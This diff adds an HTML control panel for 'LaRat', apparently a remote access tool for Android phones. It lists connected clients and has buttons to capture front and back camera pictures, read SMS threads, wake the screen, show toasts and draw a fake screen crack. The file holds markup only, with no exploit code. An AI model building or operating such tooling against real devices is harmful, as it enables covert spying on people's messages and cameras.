@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <title>
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <link href="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css"
+    rel="stylesheet">
+    <link href="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap-glyphicons.css"
+    rel="stylesheet">
+    <link href="css/index.css" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+    <script src="js/index.js"></script>
+    <link href="css/index.css" rel="stylesheet">
+</head>
+
+  <body>
+    <div class="container">
+      <h3>
+        LaRat Web Interface!
+      </h3>
+      <div class="row">
+        <div class="col-md-3 col-sm-9">
+          <div class="page-header">
+            <h3>
+              Clients
+            </h3>
+          </div>
+          <ul id="client-container" class="list-group">
+          </ul>
+          <div class="progress">
+            <div class="progress-bar" id="client-progress" style="width: 100%">
+            </div>
+          </div>
+          <a href="#" id="reload-button" class="btn btn-default fullwidth">Reload<br></a>
+        </div>
+        <div class="col-md-4 col-sm-9">
+          <div class="page-header">
+            <h3>
+              Commands
+            </h3>
+          </div>
+          <h3>
+            Generic
+          </h3>
+          <ul class="list-group">
+          </ul>
+          <table class="table">
+            <tbody>
+              <tr>
+                <td colspan="2">
+                  <a href="#" class="btn btn-default fullwidth" id="btn-screen-on">Wake Screen</a>
+                </td>
+              </tr>
+              <tr>
+                <td width="50%">
+                  <input class="form-control input-small" id="toast_message_input" type="text"
+                  placeholder="Toast Message">
+                </td>
+                <td>
+                  <button type="button" id="btn-short-toast" class="btn btn-default btn-small halfwidth">
+                    Short
+                  </button>
+                  <button type="button" id="btn-long-toast" class="btn btn-default btn-small halfwidth">
+                    Long
+                  </button>
+                </td>
+              </tr>
+              <tr>
+                <td colspan=3>
+                  <button type="button" id="btn-front-pic" class="btn btn-default halfwidth">
+                    Front Camera Picture
+                  </button>
+                  <button type="button" id="btn-back-pic" class="btn btn-default halfwidth">
+                    Back Camera Picture
+                  </button>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <h3>
+            Drawing
+          </h3>
+          <table class="table">
+            <tbody>
+              <tr>
+                <td colspan="3">
+                  <button type="button" id="btn-open-gl" class="btn btn-default btn-small halfwidth">
+                    OpenGL Demo
+                  </button>
+                  <button type="button" id="btn-screen-crack" class="btn btn-default btn-small halfwidth">
+                    Screen Crack
+                  </button>
+                  <button type="button" id="btn-pong" class="btn btn-default btn-small halfwidth">
+                    Pong
+                  </button>
+                </td>
+              </tr>
+              <tr>
+                <td colspan=1>
+                  <input class="form-control input-small" id="view_input" type="text"
+                  placeholder="View ID (empty for all)">
+                </td>
+                <td colspan=2>
+                  <button type="button" id="btn-delete-view" class="btn btn-default btn-small fullwidth">
+                    Delete view(s)
+                  </button>
+                </td>
+              </tr>
+              <tr>
+                <td colspan=1>
+                  <input class="form-control input-small" id="img_input" type="text"
+                  placeholder="Image URL">
+                </td>
+                <td colspan=2>
+                  <button type="button" id="btn-dl-image" class="btn btn-default btn-small fullwidth">
+                    Show Image
+                  </button>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+          <h3>
+            SMS
+          </h3>
+          <table class="table">
+            <tbody>
+              <tr>
+                <td colspan="2" id="btn-get-sms-threads">
+                  <a href="#" class="btn btn-default fullwidth">Get SMS Threads</a>
+                </td>
+              </tr>
+              <tr>
+                <td>
+                  <input class="form-control input-small" id="thread_input" type="text"
+                  placeholder="Thread ID">
+                </td>
+                <td>
+                  <button type="button" id="btn-get-sms" class="btn btn-default btn-small fullwidth">
+                    SMS from thread
+                  </button>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="col-md-5 col-sm-9">
+          <div class="page-header">
+            <h3>
+              Notification Center
+            </h3>
+          </div>
+          <ul id="notification-center" class="list-group">
+          </ul>
+        </div>
+      </div>
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"
+    >
+    </script>
+    <script src="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"
+    >
+    </script>
+</body>
+
+</html>
